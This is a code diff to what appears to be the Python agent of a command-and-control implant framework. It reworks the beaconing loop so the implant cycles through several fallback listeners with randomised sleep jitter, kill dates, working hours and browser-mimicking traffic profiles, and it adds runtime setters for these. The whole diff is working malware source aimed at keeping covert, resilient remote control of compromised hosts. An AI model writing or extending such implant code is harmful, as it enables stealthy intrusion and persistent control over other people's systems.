@@ -38,18 +38,10 @@ from threading import Thread
 
 # print "starting agent"
 
-# profile format ->
-#   tasking uris | user agent | additional header 1 | additional header 2 | ...
-profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
 
-if server.endswith("/"): server = server[0:-1]
 
-delay = 60
-jitter = 0.0
-lostLimit = 60
-missedCheckins = 0
+
 jobMessageBuffer = ''
-currentListenerName = ""
 sendMsgFuncCode = ""
 
 # killDate form -> "MO/DAY/YEAR"
@@ -57,44 +49,84 @@ killDate = 'REPLACE_KILLDATE'
 # workingHours form -> "9:00-17:00"
 workingHours = 'REPLACE_WORKINGHOURS'
 
-parts = profile.split('|')
-taskURIs = parts[0].split(',')
-userAgent = parts[1]
-headersRaw = parts[2:]
-
-defaultResponse = base64.b64decode("")
-
 jobs = []
 moduleRepo = {}
 _meta_cache = {}
-
-
-# global header dictionary
-#   sessionID is set by stager.py
-# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}
-headers = {'User-Agent': userAgent}
-
-# parse the headers into the global header dictionary
-for headerRaw in headersRaw:
-    try:
-        headerKey = headerRaw.split(":")[0]
-        headerValue = headerRaw.split(":")[1]
-
-        if headerKey.lower() == "cookie":
-            headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
-        else:
-            headers[headerKey] = headerValue
-    except:
-        pass
-
 
 ################################################
 #
 # communication methods
 #
 ################################################
+#COMM_FUNCTION
 
-REPLACE_COMMS
+listeners = [
+
+#LISTENER_DICT
+
+#    Example listener entry
+#    {
+#        'delay' : 60
+#        'jitter' : 0.0
+#        'profile': "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+#        'fixed_parameters': {'param1': 12, 'param2': 'Mozilla'} #fixed immutable parameters used by the function such as the profile
+#        'send_func': myfunc,
+#        'lostLimit': 60,
+#        'missedCheckins':4,
+#        'defaultResponse':'whatever',
+#    },
+]
+
+
+#def myfunc(data):
+#    #try to send data to listener example_listener
+
+curlistener = ''
+
+def send_message(message = None):
+    global listeners
+    global curlistener
+
+    #Calls each listener in turn to try and send data back
+    #to C2. Only increases missedcheckins once every one has been tried
+    for listener in listeners:
+
+        curlistener = listener
+
+        # sleep for the randomized interval
+        if listener['jitter'] < 0: listener['jitter'] = -listener['jitter']
+        if listener['jitter'] > 1: listener['jitter'] = 1/listener['jitter']
+        minSleep = int((1.0-listener['jitter'])*listener['delay'])
+        maxSleep = int((1.0+listener['jitter'])*listener['delay'])
+
+        sleepTime = random.randint(minSleep, maxSleep)
+        time.sleep(sleepTime)
+
+        #use the sending function defined in the listener dict
+        (code,data) = listener['send_func'](message, **listener['fixed_parameters'])
+
+        if code == '200': #we got a message through
+
+            try:
+                send_job_message_buffer()
+            except Exception as e:
+                result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
+                process_job_tasking(result)
+
+            if data == base64.b64decode(listener['defaultResponse']):
+                listener['missedCheckins'] = 0
+            else:
+                decode_routing_packet(data)
+
+            break           
+
+        else: #update missedCheckins for this listener
+            listener['missedCheckins'] += 1
+
+    #remove dead listeners from list
+    listeners = [ item for item in listeners if item['missedCheckins'] < item['lostLimit'] ]
+
+    return
 
 
 ################################################
@@ -198,13 +230,19 @@ def process_tasking(data):
     #   -decrypts/verifies the response to get
     #   -extracts the packets and processes each
 
+    global curlistener
+    global listeners
+
     try:
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
         
         # if we get to this point, we have a legit tasking so reset missedCheckins
-        missedCheckins = 0
+
+
+        # if we get to this point, we have a legit tasking so reset missedCheckins
+        curlistener['missedCheckins'] = 0
 
         # execute/process the packets and get any response
         resultPackets = ""
@@ -987,6 +1025,30 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
     else:
         return data
 
+def print_delay_jitter():
+    global listeners
+    for l in listeners :
+        print "{}: {}/{}".format(l["name"],l["delay"],l["jitter"])
+
+def set_delay_jitter(listenerName, delay, jitter):
+    global listeners
+    for l in listeners:
+        if l["name"] == listenerName:
+            l["delay"] = delay
+            l["jitter"] = jitter
+            break
+
+def print_lost_limits():
+    global listeners
+    for l in listeners:
+        print "{}: {}".format(l["name"],l["lostLimit"])
+
+def set_lost_limit(listener,newlimit):
+    global listeners
+    for l in listeners:
+        if l["name"] == listener:
+            l["lostLimit"] = newlimit
+            break
 ################################################
 #
 # main agent functionality
@@ -1024,34 +1086,12 @@ while(True):
                 send_message(build_response_packet(2, msg))
                 agent_exit()
 
-        # exit if we miss commnicating with the server enough times
-        if missedCheckins >= lostLimit:
+        # exit if we don't have listeners anymore
+        if not listeners:
             agent_exit()
 
-        # sleep for the randomized interval
-        if jitter < 0: jitter = -jitter
-        if jitter > 1: jitter = 1/jitter
-        minSleep = int((1.0-jitter)*delay)
-        maxSleep = int((1.0+jitter)*delay)
-
-        sleepTime = random.randint(minSleep, maxSleep)
-        time.sleep(sleepTime)
-
-        (code, data) = send_message()
-
-        if code == '200':
-            try:
-                send_job_message_buffer()
-            except Exception as e:
-                result = build_response_packet(0, str('[!] Failed to check job buffer!: ' + str(e)))
-                process_job_tasking(result)
-            if data == defaultResponse:
-                missedCheckins = 0
-            else:
-                decode_routing_packet(data)
-        else:
-            pass
-            # print "invalid code:",code
+        #not returning anything since the work is done inside this function
+        send_message()
 
     except Exception as e:
         print "main() exception: %s" % (e)
